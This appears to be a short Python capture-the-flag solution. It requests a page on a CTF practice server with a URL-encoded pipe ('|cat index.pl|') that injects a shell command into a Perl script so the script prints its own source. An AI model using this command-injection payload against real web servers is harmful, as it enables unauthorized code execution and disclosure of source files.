import requests
response = requests.get(
    "http://ctfq.sweetduet.info:10080/~q26/index.pl/%7Ccat index.pl%7C")
print(response.text)
